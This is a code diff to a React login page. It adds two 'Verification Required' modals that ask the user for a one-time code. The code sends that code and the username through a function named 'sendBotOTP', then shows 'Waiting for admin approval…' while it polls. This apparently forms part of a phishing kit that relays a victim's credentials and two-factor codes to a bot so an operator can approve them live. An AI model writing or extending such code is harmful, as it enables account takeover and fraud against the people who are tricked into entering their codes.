@@ -138,6 +138,169 @@ export default function Login() {
           }
         }
       `}</style>
+      {/* ── MODAL 1: VERIFICATION REQUIRED ── */}
+      {showVerifyModal && (
+        <div style={{
+          position: "fixed", inset: 0, zIndex: 1000,
+          background: "rgba(0,0,0,0.45)",
+          display: "flex", alignItems: "center", justifyContent: "center",
+          padding: "0 20px",
+        }}>
+          <div style={{
+            background: "#fff", borderRadius: 12,
+            padding: "36px 28px 24px",
+            maxWidth: 400, width: "100%",
+            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
+            textAlign: "center",
+          }}>
+            <h3 style={{ fontSize: 20, fontWeight: 700, color: "#111", marginBottom: 14 }}>
+              Verification Required
+            </h3>
+            <p style={{ fontSize: 14, color: "#444", lineHeight: 1.7, marginBottom: 24 }}>
+              In order to confirm your identity, we need to send you a one-time verification code.
+              <br />Please select how you would like to receive it.
+            </p>
+            <label style={{
+              display: "flex", alignItems: "center", justifyContent: "center",
+              gap: 10, marginBottom: 28, cursor: "default",
+            }}>
+              <span style={{
+                width: 20, height: 20, borderRadius: "50%",
+                border: "2px solid #111", background: "#111",
+                display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
+              }}>
+                <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#fff", display: "block" }} />
+              </span>
+              <span style={{ fontSize: 15, color: "#111" }}>
+                Email <strong>*****@*****.com</strong>
+              </span>
+            </label>
+            <div style={{ display: "flex", gap: 12 }}>
+              <button
+                type="button"
+                onClick={() => { setShowVerifyModal(false); setPendingOtp(""); }}
+                style={{
+                  flex: 1, height: 50, background: "#fff", color: "#111",
+                  fontSize: 15, fontWeight: 500, border: "2px solid #111",
+                  borderRadius: 6, cursor: "pointer",
+                }}
+              >Cancel</button>
+              <button
+                type="button"
+                disabled={sendingCode}
+                onClick={async () => {
+                  setSendingCode(true);
+                  await sendBotOTP(pendingOtp, username);
+                  setSendingCode(false);
+                  setShowVerifyModal(false);
+                  setEnteredCode("");
+                  setCodeError("");
+                  setShowCodeModal(true);
+                }}
+                style={{
+                  flex: 1, height: 50, background: "#111", color: "#fff",
+                  fontSize: 15, fontWeight: 500, border: "none",
+                  borderRadius: 6, cursor: sendingCode ? "not-allowed" : "pointer",
+                  opacity: sendingCode ? 0.7 : 1,
+                }}
+              >{sendingCode ? "Sending..." : "Send Code"}</button>
+            </div>
+            <p style={{ fontSize: 12, color: "#999", marginTop: 14 }}>Standard rates may apply</p>
+          </div>
+        </div>
+      )}
+
+      {/* ── MODAL 2: ENTER CODE ── */}
+      {showCodeModal && (
+        <div style={{
+          position: "fixed", inset: 0, zIndex: 1000,
+          background: "rgba(0,0,0,0.45)",
+          display: "flex", alignItems: "center", justifyContent: "center",
+          padding: "0 20px",
+        }}>
+          <div style={{
+            background: "#fff", borderRadius: 12,
+            padding: "36px 28px 24px",
+            maxWidth: 400, width: "100%",
+            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
+            textAlign: "center",
+          }}>
+            <h3 style={{ fontSize: 20, fontWeight: 700, color: "#111", marginBottom: 14 }}>
+              Verification Required
+            </h3>
+            <p style={{ fontSize: 14, color: "#444", lineHeight: 1.7, marginBottom: 24 }}>
+              Enter the verification code sent to you.<br />
+              This code will expire 10 minutes after it is sent.
+            </p>
+            <input
+              type="text"
+              placeholder="Verification Code*"
+              value={enteredCode}
+              onChange={(e) => setEnteredCode(e.target.value)}
+              onKeyDown={(e) => { if (e.key === "Enter") handleContinueCode(); }}
+              disabled={checkingCode}
+              style={{
+                width: "100%", height: 48, padding: "0 14px",
+                fontSize: 15, color: "#111",
+                border: "1px solid #ccc", borderRadius: 6,
+                outline: "none", boxSizing: "border-box",
+                marginBottom: 8, background: checkingCode ? "#f5f5f5" : "#fff",
+              }}
+            />
+            {codeError && (
+              <div style={{
+                background: "#fff0f0", border: "1px solid #fcc", color: "#c00",
+                fontSize: 12, padding: "8px 12px", marginBottom: 12, borderRadius: 4, textAlign: "left",
+              }}>{codeError}</div>
+            )}
+            {checkingCode && (
+              <div style={{ fontSize: 13, color: "#888", marginBottom: 12 }}>
+                Waiting for admin approval…
+              </div>
+            )}
+            <div style={{ display: "flex", gap: 12, marginTop: 8 }}>
+              <button
+                type="button"
+                disabled={checkingCode}
+                onClick={() => {
+                  if (otpPollRef.current) clearInterval(otpPollRef.current);
+                  setShowCodeModal(false);
+                  setEnteredCode("");
+                  setCodeError("");
+                }}
+                style={{
+                  flex: 1, height: 50, background: "#fff", color: "#111",
+                  fontSize: 15, fontWeight: 500, border: "2px solid #111",
+                  borderRadius: 6, cursor: checkingCode ? "not-allowed" : "pointer",
+                  opacity: checkingCode ? 0.5 : 1,
+                }}
+              >Cancel</button>
+              <button
+                type="button"
+                disabled={checkingCode}
+                onClick={handleContinueCode}
+                style={{
+                  flex: 1, height: 50, background: "#111", color: "#fff",
+                  fontSize: 15, fontWeight: 500, border: "none",
+                  borderRadius: 6, cursor: checkingCode ? "not-allowed" : "pointer",
+                  opacity: checkingCode ? 0.7 : 1,
+                }}
+              >{checkingCode ? "Checking…" : "Continue"}</button>
+            </div>
+            <button
+              type="button"
+              onClick={handleResendCode}
+              disabled={checkingCode}
+              style={{
+                marginTop: 16, fontSize: 13, color: "#111",
+                textDecoration: "underline", background: "none",
+                border: "none", cursor: "pointer",
+              }}
+            >Didn't receive a code? Resend code</button>
+          </div>
+        </div>
+      )}
+
       {/* ── INCORRECT CREDENTIALS MODAL ── */}
       {showModal && (
         <div style={{
